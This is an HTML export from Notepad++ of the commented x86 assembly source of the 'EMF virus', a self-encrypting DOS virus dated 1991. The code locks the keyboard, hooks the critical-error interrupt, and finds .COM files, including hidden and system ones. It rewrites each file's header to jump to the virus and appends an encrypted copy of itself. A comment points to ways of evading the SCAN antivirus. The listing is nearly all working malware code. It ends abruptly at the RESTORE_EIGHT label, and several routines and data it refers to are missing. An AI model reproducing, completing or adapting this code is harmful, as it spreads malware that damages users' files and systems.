<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc5">DATA</span><span class="sc0"> </span><span class="sc9">SEGMENT</span><span class="sc0">
</span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc2">100H</span><span class="sc0">
</span><span class="sc5">DATA</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">; The EMF virus (c)1991 by Lazarus Long, Inc.</span><span class="sc0">
</span><span class="sc1">;  The author assumes no responsibility for any damage incurred</span><span class="sc0">
</span><span class="sc1">;  from the execution of this file, intentional or not</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">VIRUS_START</span><span class="sc0"> 
         
</span><span class="sc5">ENCRYPT_BYTE</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">00H</span><span class="sc0">             </span><span class="sc1">;Storage space for byte that ID string is</span><span class="sc0">
                                </span><span class="sc1">;Encrypted by</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;The code from here to ENC_START is always unencrypted and SCAN would be able  ;</span><span class="sc0">
</span><span class="sc1">;to find it. Maybe a quick look at V2P7 would be in order (Hint,Hint!)         ;</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">VIRUS_START</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">NEXT_STEP</span><span class="sc0">
</span><span class="sc5">NEXT_STEP</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">                            </span><span class="sc1">;All actions relative to BP,</span><span class="sc0">

         </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">21H</span><span class="sc0">                         </span><span class="sc1">;Lock out keyboard</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
         </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">


         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">ENC_LENGTH</span><span class="sc0">                 </span><span class="sc1">;Number of bytes to decrypt                                         ;cause offsets</span><span class="sc0">

         </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENC_START</span><span class="sc4">-</span><span class="sc5">NEXT_STEP</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Offset of data to decrypt                                          ;change in infected files</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,[</span><span class="sc2">103H</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;Byte to decrypt with</span><span class="sc0">

         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">CRYPT</span><span class="sc0">                        </span><span class="sc1">;Decrypt main body of virus</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">RESTORE_EIGHT</span><span class="sc0">
         </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">SAVE_PSP</span><span class="sc0">                      </span><span class="sc1">;Continue</span><span class="sc0">

</span><span class="sc5">INFECT</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">CRYPT_WRITE</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">                       </span><span class="sc1">;Starting from BP-3</span><span class="sc0">
         </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">;Which,convienently,is the start</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">ENC_END</span><span class="sc4">-</span><span class="sc2">108H</span><span class="sc0">             </span><span class="sc1">;of our viral code</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">                         </span><span class="sc1">;Write all of virus</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">CRYPT_WRITE</span><span class="sc0">                </span><span class="sc1">;Return and continue</span><span class="sc0">
         </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">CRYPT_WRITE</span><span class="sc4">:</span><span class="sc0">

         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">ENC_LENGTH</span><span class="sc0">                         </span><span class="sc1">;Number of bytes to decrypt</span><span class="sc0">
         </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENC_START</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">NEXT_STEP</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Address to start decryption</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,[</span><span class="sc2">0FBH</span><span class="sc4">]</span><span class="sc0">                             </span><span class="sc1">;Byte to decrypt with</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">CRYPT</span><span class="sc0">
         </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc1">;******************************************************************************;</span><span class="sc0">
</span><span class="sc1">;Call this with SI equal to address to XOR,and CX number of bytes to XOR       :</span><span class="sc0">
</span><span class="sc1">;                                                                              ;</span><span class="sc0">
</span><span class="sc1">;******************************************************************************;</span><span class="sc0">
</span><span class="sc5">CRYPT</span><span class="sc4">:</span><span class="sc0">         
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc0"> </span><span class="sc1">;XOR it</span><span class="sc0">
         </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">               </span><span class="sc1">;Increment XOR address</span><span class="sc0">
         </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">               </span><span class="sc1">;Change encryption key,eh?</span><span class="sc0">
         </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">               </span><span class="sc1">;Reverse the key</span><span class="sc0">
         </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">CRYPT</span><span class="sc0">           </span><span class="sc1">;Until CX=0</span><span class="sc0">
         </span><span class="sc6">RET</span><span class="sc0">                  </span><span class="sc1">;Then return                      </span><span class="sc0">

</span><span class="sc1">;******************************************************************************;</span><span class="sc0">
</span><span class="sc1">; Save PSP                                                                     ;</span><span class="sc0">
</span><span class="sc1">;******************************************************************************;</span><span class="sc0">

</span><span class="sc5">ENC_START</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">SAVE_PSP</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">30H</span><span class="sc0">                        </span><span class="sc1">;Get DOS version</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
         </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                          </span><span class="sc1">;Lower than 2?</span><span class="sc0">
         </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">ABOVE_2</span><span class="sc0">                       </span><span class="sc1">;No,continue</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">RESTORE_EIGHT</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">100H</span><span class="sc0">                       </span><span class="sc1">;If so return</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
         </span><span class="sc6">RET</span><span class="sc0"> </span><span class="sc2">0FFFFH</span><span class="sc0">

</span><span class="sc5">ABOVE_2</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">                           </span><span class="sc1">;Save ES</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3524H</span><span class="sc0">                      </span><span class="sc1">;Get INT 24 address</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">OLD_B</span><span class="sc4">-</span><span class="sc5">NEXT_STEP</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">       </span><span class="sc1">;Save it</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">OLD_E</span><span class="sc4">-</span><span class="sc5">NEXT_STEP</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">25H</span><span class="sc0">                        </span><span class="sc1">;Now set it to our own code</span><span class="sc0">
         </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">NEW_24</span><span class="sc4">-</span><span class="sc5">NEXT_STEP</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">                            </span><span class="sc1">;Restore ES</span><span class="sc0">

         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc0">                      </span><span class="sc1">;Number of bytes to save</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                      </span><span class="sc1">;From 80H.  ie the PSP</span><span class="sc0">
         </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">ENC_END</span><span class="sc4">-</span><span class="sc5">NEXT_STEP</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;To the end of our code</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">                         </span><span class="sc1">;Save location so we can restore the bytes</span><span class="sc0">
         </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">                       </span><span class="sc1">;Mov'em</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------------;                                                                              ;</span><span class="sc0">
</span><span class="sc1">; Find first .COM file that is either Hidden,read-only,system,or archive       ;</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------;</span><span class="sc0">


</span><span class="sc5">FIND_FIRST</span><span class="sc4">:</span><span class="sc0">

         </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">WILD_CARD</span><span class="sc4">-</span><span class="sc5">NEXT_STEP</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Offset of *.COM,00</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">27H</span><span class="sc0">                       </span><span class="sc1">;Find ANY file that fits *.COM</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4EH</span><span class="sc0">                       </span><span class="sc1">;Find first matching file</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">     
         </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">QUIT</span><span class="sc0">                          </span><span class="sc1">;If no *.COM files found,quit</span><span class="sc0">
         </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">SET_ATTRIBS</span><span class="sc0">

</span><span class="sc5">FIND_AGAIN</span><span class="sc4">:</span><span class="sc0">

         </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">WILD_CARD</span><span class="sc4">-</span><span class="sc5">NEXT_STEP</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Offset of *.com</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4FH</span><span class="sc0">                   </span><span class="sc1">;Find next matching file</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">27H</span><span class="sc0">                   </span><span class="sc1">;Archive,Hidden,Read-only,or System</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
         </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">QUIT</span><span class="sc0">                      </span><span class="sc1">;No more files? Then exit</span><span class="sc0">

</span><span class="sc5">SET_ATTRIBS</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc2">096H</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Get time</span><span class="sc0">
         </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1EH</span><span class="sc0">             </span><span class="sc1">;Are the seconds set to 60?</span><span class="sc0">
         </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1EH</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">FIND_AGAIN</span><span class="sc0">          </span><span class="sc1">;If so,assume this file is infected,find another</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; Open file and infect it.                                                     ;</span><span class="sc0">
</span><span class="sc1">;                                                                              ;</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------;</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">9EH</span><span class="sc0">                  </span><span class="sc1">;offset into DTA of filename</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">                </span><span class="sc1">;Set file attribs</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                   </span><span class="sc1">;To normal file</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
         </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">QUIT</span><span class="sc0">                     </span><span class="sc1">;Some sort of error occured,exit now!</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3D02H</span><span class="sc0">                </span><span class="sc1">;Code for open file with read and write</span><span class="sc0">
                                     </span><span class="sc1">;access</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">                     </span><span class="sc1">;DX points to ASCIIZ string of filename</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">                   </span><span class="sc1">;Read four bytes</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">;Save handle for future use</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0ACH</span><span class="sc0">                 </span><span class="sc1">;Set buffer to end of DTA</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">                  </span><span class="sc1">;Read from file</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
         </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">MAKE_HEADER</span><span class="sc0">

</span><span class="sc5">QUIT</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">DONE</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; Infect .COM header so it jumps to our viral code                             ;</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">MAKE_HEADER</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0F9H</span><span class="sc4">],[</span><span class="sc2">9AH</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;Offset off file size in DTA</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0F8H</span><span class="sc4">]</span><span class="sc5">B</span><span class="sc4">,</span><span class="sc2">0E9H</span><span class="sc0">             </span><span class="sc1">;Code for absolute JMP</span><span class="sc0">
         </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0F9H</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">;Adjust it just a bit</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">                 </span><span class="sc1">;Set file pointer to beginning</span><span class="sc0">
                                      </span><span class="sc1">;of file to be infected</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                    </span><span class="sc1">;Zero out CX</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                    </span><span class="sc1">;Zero out DX</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2CH</span><span class="sc0">                   </span><span class="sc1">;Get time</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
         </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,[</span><span class="sc2">104H</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;And add to what we had before</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0FBH</span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc0">                </span><span class="sc1">;Save that value for our key</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">                   </span><span class="sc1">;Write to file</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0F8H</span><span class="sc0">                  </span><span class="sc1">;Starting at F8 hex</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">04H</span><span class="sc0">                   </span><span class="sc1">;Write eight bytes</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
         
</span><span class="sc10">ERROR</span><span class="sc4">:</span><span class="sc0">   
         </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">DONE</span><span class="sc0">                     </span><span class="sc1">;Some sort of error?</span><span class="sc0">
                                     </span><span class="sc1">;If so,exit</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; Attach our viral code to the end of the target .COM file                     ;</span><span class="sc0">
</span><span class="sc1">;                                                                              ;</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------;</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0ACH</span><span class="sc0">                 </span><span class="sc1">;Starting at A9h</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">                   </span><span class="sc1">;Mov eight bytes</span><span class="sc0">
         </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">ORIGINAL_EIGHT</span><span class="sc4">-</span><span class="sc5">NEXT_STEP</span><span class="sc4">]</span><span class="sc1">;Where to save original eight bytes to</span><span class="sc0">
         </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">                   </span><span class="sc1">;Save infected files original eight bytes</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4202H</span><span class="sc0">                </span><span class="sc1">;Set file pointer to end of file</span><span class="sc0">
                                     </span><span class="sc1">;plus 1</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                   </span><span class="sc1">;Zero CX</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;Make DX=1</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INFECT</span><span class="sc0">                    </span><span class="sc1">;Encrypt code, write it to file,</span><span class="sc0">
                                        </span><span class="sc1">;Decrypt it,and return</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; This restores the files original date and time                               ;</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------;</span><span class="sc0">

         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5701H</span><span class="sc0">                   </span><span class="sc1">;Restore original date and time</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,[</span><span class="sc2">96H</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;From what was read in earlier</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,[</span><span class="sc2">98H</span><span class="sc4">]</span><span class="sc0">                    
         </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0FFE0H</span><span class="sc0">
         </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">01EH</span><span class="sc0">                    </span><span class="sc1">;Change seconds to 60</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">                     </span><span class="sc1">;Close that file</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
         </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">RESTORE_ATTRIBS</span><span class="sc0">           </span><span class="sc1">;Restore it's attributes</span><span class="sc0">

</span><span class="sc5">DONE</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">RESTORE_PSP</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">                        </span><span class="sc1">;Save the DS register</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">OLD_B</span><span class="sc4">-</span><span class="sc5">NEXT_STEP</span><span class="sc4">]</span><span class="sc5">W</span><span class="sc0">   </span><span class="sc1">;Move the old INT 24's address</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">OLD_E</span><span class="sc4">-</span><span class="sc5">NEXT_STEP</span><span class="sc4">]</span><span class="sc5">W</span><span class="sc0">   </span><span class="sc1">;so we can restore it</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">2524H</span><span class="sc0">                   </span><span class="sc1">;Restore it</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">                         </span><span class="sc1">;Restore the DS register</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">                         </span><span class="sc1">;SI is equal to address we stored</span><span class="sc0">
                                        </span><span class="sc1">;our PSP at</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                     </span><span class="sc1">;Want to move saved PSP to 80h</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc0">                     </span><span class="sc1">;Want to move 128 bytes</span><span class="sc0">
         </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">100H</span><span class="sc0">                    </span><span class="sc1">;Odd sort of jump</span><span class="sc0">
         </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">                        </span><span class="sc1">;Ends up restoring control to</span><span class="sc0">
                                        </span><span class="sc1">;100h</span><span class="sc0">
         </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">                     </span><span class="sc1">;Unlock keyboard</span><span class="sc0">
         </span><span class="sc6">RET</span><span class="sc0"> </span><span class="sc2">0FFFFH</span><span class="sc0">                     </span><span class="sc1">;Pop off all of stack</span><span class="sc0">
 
 </span><span class="sc5">RESTORE_EIGHT</span><span class="sc4">:</span><span class="sc0">        
